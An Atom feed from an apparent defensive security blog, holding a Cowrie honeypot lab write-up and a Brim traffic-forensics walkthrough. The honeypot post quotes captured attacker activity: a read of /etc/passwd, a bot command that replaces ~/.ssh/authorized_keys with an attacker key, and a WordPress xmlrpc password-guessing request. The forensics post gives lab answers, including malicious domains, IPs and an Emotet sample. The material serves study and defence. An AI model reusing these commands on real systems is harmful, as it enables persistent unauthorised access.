@@ -1,0 +1,1577 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="https://jayngng.github.io/blog/feed.xml" rel="self" type="application/atom+xml" /><link href="https://jayngng.github.io/" rel="alternate" type="text/html" /><updated>2021-10-12T22:29:15+11:00</updated><id>https://jayngng.github.io/blog/feed.xml</id><entry><title type="html">Cowrie Honeypot - Honeypot</title><link href="https://jayngng.github.io/blog/cowrie-honeypot/" rel="alternate" type="text/html" title="Cowrie Honeypot - Honeypot" /><published>2021-10-13T07:12:24+11:00</published><updated>2021-10-13T07:12:24+11:00</updated><id>https://jayngng.github.io/blog/cowrie-honeypot</id><content type="html" xml:base="https://jayngng.github.io/blog/cowrie-honeypot/">&lt;h2 id=&quot;lab-description&quot;&gt;&lt;strong&gt;Lab Description&lt;/strong&gt;&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;The lab is provided by TryHackMe - Creators: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CoolComputerMan&lt;/code&gt;.&lt;/li&gt;
+  &lt;li&gt;Link to access the lab: &lt;a href=&quot;https://tryhackme.com/room/introductiontohoneypots&quot;&gt;here&lt;/a&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Our final goal is to comprehend &lt;a href=&quot;https://github.com/cowrie/cowrie&quot;&gt;Cowrie honeypot&lt;/a&gt; and it’s functionalities.&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;introduction-to-honeypot&quot;&gt;&lt;strong&gt;Introduction to Honeypot&lt;/strong&gt;&lt;/h2&gt;
+
+&lt;p&gt;Honeypot is an intentionally vulnerable machine used to attract attackers and record their activites.&lt;/p&gt;
+
+&lt;p&gt;Here are some highlights of Honeypot’s utilities:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Alert administrators of potential breaches.&lt;/li&gt;
+  &lt;li&gt;Understand adversaries, i.e. tools and techniques used.&lt;/li&gt;
+  &lt;li&gt;Distract attacker away from real infrastructures. This will lend us more time to respond to the attack.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;types-of-honeypots&quot;&gt;&lt;strong&gt;Types of Honeypots&lt;/strong&gt;&lt;/h2&gt;
+
+&lt;h4 id=&quot;honeypot-interactivity-and-classification&quot;&gt;&lt;strong&gt;Honeypot Interactivity and Classification&lt;/strong&gt;&lt;/h4&gt;
+
+&lt;p&gt;&lt;strong&gt;1. Low-Interaction&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Offer limitation in terms of activities to the adversaries. Basically, the adversaries will be limited in any post-exploitation actions against the Honeypot.&lt;/p&gt;
+
+&lt;p&gt;For instance, &lt;a href=&quot;https://github.com/phin3has/mailoney&quot;&gt;SMTP Honeypot&lt;/a&gt; by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;awhitehatter&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;2. Medium-Interaction&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Emulate real environment such as vulnerable services, and underlying OS, shell and file systems. Yet, attackers cannot fully perform post-exploitation procedures.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://github.com/cowrie/cowrie&quot;&gt;Cowrie honeypot&lt;/a&gt; will be a good example.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;3. High-Interaction&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Is usually a Virtual Machines with intentional vulnerabilities. It is crucial to manage this Honeypot well enough, otherwise, adversaries could abuse it as a foundation to compromise other assets.&lt;/p&gt;
+
+&lt;h4 id=&quot;deployment-location&quot;&gt;&lt;strong&gt;Deployment Location&lt;/strong&gt;&lt;/h4&gt;
+
+&lt;p&gt;&lt;strong&gt;1. Internal honeypots&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Deployed inside LAN. This is typically used as a monitor of a network to hunt threats from the inside.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;2. External honeypots&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Deployed outside LAN. This is typically used as a monitor from outside of a network. This deployment will give us more data since it is likely to be targeted at all times.&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;cowrie-honeypot&quot;&gt;&lt;strong&gt;Cowrie Honeypot&lt;/strong&gt;&lt;/h2&gt;
+
+&lt;p&gt;Cowrie honeypot is a Low-, Medium- Interactive shell. We can try to login via SSH service.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh root@10.10.150.41                                                              
+root@10.10.150.41&lt;span class=&quot;s1&quot;&gt;&apos;s password: 
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+root@acmeweb:~# ls 
+root@acmeweb:~# ls -al 
+drwx------ 1 root root 4096 2013-04-05 12:25 .
+drwxr-xr-x 1 root root 4096 2013-04-05 12:03 ..
+drwx------ 1 root root 4096 2013-04-05 11:58 .aptitude
+-rw-r--r-- 1 root root  570 2013-04-05 11:52 .bashrc
+-rw-r--r-- 1 root root  140 2013-04-05 11:52 .profile
+drwx------ 1 root root 4096 2013-04-05 12:05 .ssh
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We can basically execute any command on the target system. Yet, there are two noticeable things:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;We &lt;strong&gt;can’t&lt;/strong&gt; execute any &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bash&lt;/code&gt; script. This is a limitation of a low and medium honeypot.&lt;/li&gt;
+  &lt;li&gt;Trying to create a file, we log back in, the file is deleted.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;cowrie-logs&quot;&gt;&lt;strong&gt;Cowrie Logs&lt;/strong&gt;&lt;/h2&gt;
+
+&lt;p&gt;Cowrie offers an outstanding ability to log all events that can track every connection and command handled by the system.&lt;/p&gt;
+
+&lt;p&gt;To demonstrate the idea, let’s us inspect a log file.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;cowrie.json | jq &lt;span class=&quot;s1&quot;&gt;&apos;.message&apos;&lt;/span&gt;
+&lt;span class=&quot;s2&quot;&gt;&quot;New connection: 10.4.1.61:40342 (10.10.150.41:22) [session: b51c7f5d06d4]&quot;&lt;/span&gt; 
+&lt;span class=&quot;s2&quot;&gt;&quot;Remote SSH version: SSH-2.0-OpenSSH_8.4p1 Debian-6&quot;&lt;/span&gt; 
+&lt;span class=&quot;s2&quot;&gt;&quot;SSH client hassh fingerprint: ae8bd7dd09970555aa4c6ed22adbbf56&quot;&lt;/span&gt; 
+&lt;span class=&quot;s2&quot;&gt;&quot;login attempt [root/] succeeded&quot;&lt;/span&gt; 
+&lt;span class=&quot;s2&quot;&gt;&quot;Terminal Size: 190 46&quot;&lt;/span&gt; 
+&lt;span class=&quot;s2&quot;&gt;&quot;request_env: LANG=en_US.UTF-8&quot;&lt;/span&gt; 
+&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; 
+&lt;span class=&quot;s2&quot;&gt;&quot;CMD: ls&quot;&lt;/span&gt; 
+&lt;span class=&quot;s2&quot;&gt;&quot;CMD: ls -al&quot;&lt;/span&gt; 
+&lt;span class=&quot;s2&quot;&gt;&quot;CMD: cat /etc/passwd&quot;&lt;/span&gt; 
+&lt;span class=&quot;s2&quot;&gt;&quot;CMD: su phil&quot;&lt;/span&gt; 
+&lt;span class=&quot;s2&quot;&gt;&quot;CMD: su phila&quot;&lt;/span&gt; 
+&lt;span class=&quot;s2&quot;&gt;&quot;CMD: ls -al&quot;&lt;/span&gt; 
+&lt;span class=&quot;s2&quot;&gt;&quot;CMD: ls /home&quot;&lt;/span&gt; 
+&lt;span class=&quot;s2&quot;&gt;&quot;CMD: uname -a&quot;&lt;/span&gt; 
+&lt;span class=&quot;s2&quot;&gt;&quot;CMD: bash -c &apos;whoami&apos;&quot;&lt;/span&gt; 
+&lt;span class=&quot;s2&quot;&gt;&quot;CMD: whoami&quot;&lt;/span&gt; 
+&lt;span class=&quot;s2&quot;&gt;&quot;CMD: vi test.sh&quot;&lt;/span&gt; 
+&lt;span class=&quot;s2&quot;&gt;&quot;CMD: nano test.sh&quot;&lt;/span&gt; 
+&lt;span class=&quot;s2&quot;&gt;&quot;CMD: stty&quot;&lt;/span&gt; 
+&lt;span class=&quot;s2&quot;&gt;&quot;CMD: echo &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;whoami&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; &amp;gt; test.sh&quot;&lt;/span&gt; 
+&lt;span class=&quot;s2&quot;&gt;&quot;CMD: bash test.sh&quot;&lt;/span&gt; 
+&lt;span class=&quot;s2&quot;&gt;&quot;Saved redir contents with SHA-256 33e7267d8409d63707706f95f3d67ee9be5fd3a2c6ffc60856c9baeca1ae3ed4 to var/lib/cowrie/downloads/33e7267d8409d63707706f95f3d67ee9be5fd3a2c6ffc60856c9baeca1ae3ed4&quot;&lt;/span&gt;                                                                                                                                                                                           
+&lt;span class=&quot;s2&quot;&gt;&quot;Closing TTY Log: var/lib/cowrie/tty/62b86306def6e51672e9dcfb4ced59089ace9c056c0bc9597a0a49d73ae2a40a after 178 seconds&quot;&lt;/span&gt; 
+&lt;span class=&quot;s2&quot;&gt;&quot;Connection lost after 183 seconds&quot;&lt;/span&gt; 
+&lt;span class=&quot;s2&quot;&gt;&quot;New connection: 10.4.1.61:40344 (10.10.150.41:22) [session: 2eae2e2585fe]&quot;&lt;/span&gt; 
+&lt;span class=&quot;s2&quot;&gt;&quot;Remote SSH version: SSH-2.0-OpenSSH_8.4p1 Debian-6&quot;&lt;/span&gt; 
+&lt;span class=&quot;s2&quot;&gt;&quot;SSH client hassh fingerprint: ae8bd7dd09970555aa4c6ed22adbbf56&quot;&lt;/span&gt; 
+&lt;span class=&quot;s2&quot;&gt;&quot;login attempt [root/] succeeded&quot;&lt;/span&gt; 
+&lt;span class=&quot;s2&quot;&gt;&quot;Terminal Size: 190 44&quot;&lt;/span&gt; 
+&lt;span class=&quot;s2&quot;&gt;&quot;request_env: LANG=en_US.UTF-8&quot;&lt;/span&gt; 
+&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; 
+&lt;span class=&quot;s2&quot;&gt;&quot;CMD: ls&quot;&lt;/span&gt; 
+&lt;span class=&quot;s2&quot;&gt;&quot;CMD: ls -al&quot;&lt;/span&gt; 
+&lt;span class=&quot;s2&quot;&gt;&quot;CMD: &quot;&lt;/span&gt; 
+&lt;span class=&quot;s2&quot;&gt;&quot;Closing TTY Log: var/lib/cowrie/tty/7b69298197ba2c2d62ad31598e0b47682e290c71ff6b87f5e00c3f78c77f3876 after 179 seconds&quot;&lt;/span&gt; 
+&lt;span class=&quot;s2&quot;&gt;&quot;Connection lost after 182 seconds&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;As we can see, all the system commands are recorded.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; we also notice that if with the external honeypots, it’s practically impossible to parse the log using CLI. To have a better vision, it’s recommended to commbine with logging platform such as ELK Stack.&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;attacks-against-ssh&quot;&gt;&lt;strong&gt;Attacks Against SSH&lt;/strong&gt;&lt;/h2&gt;
+
+&lt;p&gt;Normally, attacks against the SSH service are done via a famous tool named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hydra&lt;/code&gt;. Since Cowrie only leaves one SSH opened, it’s relatively easy to mitigate the attack.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Defense:&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Strong password.&lt;/li&gt;
+  &lt;li&gt;Public key authentication.&lt;/li&gt;
+  &lt;li&gt;Fail2ban&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Those are the most ubiquitous ways to effectively mitigate such attacks.&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;typical-post-exploitation-activity&quot;&gt;&lt;strong&gt;Typical Post Exploitation Activity&lt;/strong&gt;&lt;/h2&gt;
+
+&lt;p&gt;Typically, the bot will perform post-exploitation activities such as:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Check target’s kernel version using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;uname&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nproc&lt;/code&gt;. Besides, they will try to read contents of files such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/issue&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/proc/cpuinfo&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;As we notice, Cowrie will return incorrect values of the Debian version when executing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;uname -a&lt;/code&gt; command.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@acmeweb:~# &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/issue 
+Ubuntu 18.04.5 LTS &lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\l&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# -&amp;gt; Real&lt;/span&gt;
+
+root@acmeweb:~# &lt;span class=&quot;nb&quot;&gt;uname&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; 
+Linux acmeweb 3.2.0-4-amd64 &lt;span class=&quot;c&quot;&gt;#1 SMP Debian 3.2.68-1+deb7u1 x86_64 GNU/Linux&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Install malicious software using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wget&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl&lt;/code&gt; commands. However, as we mentioned, Cowrie will prevent bash execution to reduce the risks that a Honeypot might take.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Delete all logs to prevent forensic activities. Cowrie counters that by logging all activities externally.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;identification-techniques&quot;&gt;&lt;strong&gt;Identification Techniques&lt;/strong&gt;&lt;/h2&gt;
+
+&lt;p&gt;After the target is compromised, bots will execute orders of commands to enumerate the target&lt;/p&gt;
+
+&lt;p&gt;For instance, If we investigate the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BotCommands/Sample3.txt&lt;/code&gt; file,&lt;/p&gt;
+
+&lt;div class=&quot;language-md highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;...
+cd ~ &amp;amp;&amp;amp; rm -rf .ssh &amp;amp;&amp;amp; mkdir .ssh &amp;amp;&amp;amp; echo &lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&amp;gt;&amp;gt;.ssh/authorized_keys &amp;amp;&amp;amp; chmod -R go= ~/.ssh &amp;amp;&amp;amp; cd ~
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;there is a highly identificable public SSH Key from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Outlaw&lt;/code&gt; group is written into the target system to maintain access.&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;ssh-tunnelling&quot;&gt;&lt;strong&gt;SSH Tunnelling&lt;/strong&gt;&lt;/h2&gt;
+
+&lt;p&gt;By default, Cowrie will log and drop all the SSH tunnelling traffic to the destination. This data is beneficial to detect web attacks.&lt;/p&gt;
+
+&lt;p&gt;If we inspect the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Tunnelling/Sample1.txt&lt;/code&gt; log, we can see that attacker targets the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wordpress&lt;/code&gt; website.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;Sample1.txt 
+2021-03-17T10:09:51.052837Z &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;SSHChannel cowrie-discarded-direct-tcpip &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;62&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; on SSHService b&lt;span class=&quot;s1&quot;&gt;&apos;ssh-connection&apos;&lt;/span&gt; on HoneyPotSSHTransport,118939,0.0.0.0] discarded direct-tcp forward request 62 to &amp;lt;A DOMAIN&amp;gt;:80 with data b&lt;span class=&quot;s1&quot;&gt;&apos;POST /xmlrpc.php HTTP/1.1\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nConnection: keep-alive\r\nContent-Length: 201\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: &amp;lt;A DOMAIN&amp;gt;\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.109 Safari/537.36\r\n\r\n&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;&amp;lt;methodCall&amp;gt;&amp;lt;methodName&amp;gt;wp.getUsersBlogs&amp;lt;/methodName&amp;gt;&amp;lt;params&amp;gt;&amp;lt;param&amp;gt;&amp;lt;value&amp;gt;admin&amp;lt;/value&amp;gt;&amp;lt;/param&amp;gt;&amp;lt;param&amp;gt;&amp;lt;value&amp;gt;password11\r&amp;lt;/value&amp;gt;&amp;lt;/param&amp;gt;&amp;lt;/params&amp;gt;&amp;lt;/methodCall&amp;gt;
+...
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;conclusion&quot;&gt;&lt;strong&gt;Conclusion&lt;/strong&gt;&lt;/h2&gt;
+
+&lt;p&gt;To conclude, Cowrie Honeypot is a great example to demonstrate how attacker’s artifacts are collected for digital forensics activities. Yet, we need to be very careful due to potential risks if it’s not properly configured.&lt;/p&gt;</content><author><name></name></author><category term="honeypot" /><category term="blueteam" /><category term="soc" /><summary type="html">Lab Description</summary></entry><entry><title type="html">Traffic Forensics with Brim</title><link href="https://jayngng.github.io/blog/traffic-forensics-with-brim/" rel="alternate" type="text/html" title="Traffic Forensics with Brim" /><published>2021-10-10T23:37:57+11:00</published><updated>2021-10-10T23:37:57+11:00</updated><id>https://jayngng.github.io/blog/traffic-forensics-with-brim</id><content type="html" xml:base="https://jayngng.github.io/blog/traffic-forensics-with-brim/">&lt;h2 id=&quot;lab-note&quot;&gt;&lt;strong&gt;Lab Note&lt;/strong&gt;&lt;/h2&gt;
+&lt;p&gt;The lab is provided by TryHackMe - Creators: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;heavenraiza&lt;/code&gt; &amp;amp; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RussianPanda&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Link to access the lab: &lt;a href=&quot;https://tryhackme.com/room/mastermindsxlq&quot;&gt;Masterminds&lt;/a&gt; (Free lab).&lt;/p&gt;
+
+&lt;p&gt;In this lab, we employ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;brim&lt;/code&gt; to perform traffic forensics. More info about &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;brim&lt;/code&gt; can be found &lt;a href=&quot;https://www.brimdata.io/&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Our goal is to answer the questions in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Task 2&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Task 3&lt;/code&gt;, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Task 4&lt;/code&gt; of the &lt;a href=&quot;https://tryhackme.com/room/mastermindsxlq&quot;&gt;lab&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;task-2---infection-1&quot;&gt;&lt;strong&gt;Task 2 - [Infection 1]&lt;/strong&gt;&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;1. Provide the victim’s IP address.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Answer: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;192.168.75.249&lt;/code&gt;.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Query:&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/brimthm/1.png&quot; title=&quot;brimthm/1.png&quot; alt=&quot;brimthm/1.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;2. The victim attempted to make HTTP connections to two suspicious domains with the status ‘404 Not Found’. Provide the hosts/domains requested.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Answer: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cambiasuhistoria.growlab.es, www.letscompareonline.com&lt;/code&gt;.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Query: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_path==&quot;http&quot; | cut id.orig_h, id.resp_h, id.resp_p, method,host, uri, status_code | uniq -c&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/brimthm/2.png&quot; title=&quot;brimthm/2.png&quot; alt=&quot;brimthm/2.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;3. The victim made a successful HTTP connection to one of the domains and received the response_body_len of 1,309 (uncompressed content size of the data tr+ Answerferred from the server). Provide the domain and the destination IP address.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Answer: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ww25.gocphongthe.com,199.59.242.153&lt;/code&gt;.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Query: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_path==&quot;http&quot; | cut id.orig_h, id.resp_h, id.resp_p, method,host, uri, response_body_len | uniq -c&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/brimthm/3.png&quot; title=&quot;brimthm/3.png&quot; alt=&quot;brimthm/3.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;4. How many unique DNS requests were made to cab[.]myfkn[.]com domain (including the capitalized domain)?&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Answer: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;7&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Query: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_path==&quot;dns&quot; | count() by query | sort -r&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/brimthm/4.png&quot; title=&quot;brimthm/4.png&quot; alt=&quot;brimthm/4.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;5.Provide the URI of the domain bhaktivrind[.]com that the victim reached out over HTTP.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Answer: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/cgi-bin/JBbb8/&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Query: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_path==&quot;http&quot; host==&quot;bhaktivrind.com&quot;&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/brimthm/5.png&quot; title=&quot;brimthm/5.png&quot; alt=&quot;brimthm/5.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;6. Provide the IP address of the malicious server and the executable that the victim downloaded from the server.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Answer: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;185.239.243.112,catzx.exe&lt;/code&gt;.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Query: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_path==&quot;http&quot;&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/brimthm/6.png&quot; title=&quot;brimthm/6.png&quot; alt=&quot;brimthm/6.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;7. Based on the information gathered from the second question, provide the name of the malware using VirusTotal.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Answer: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Emotet&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
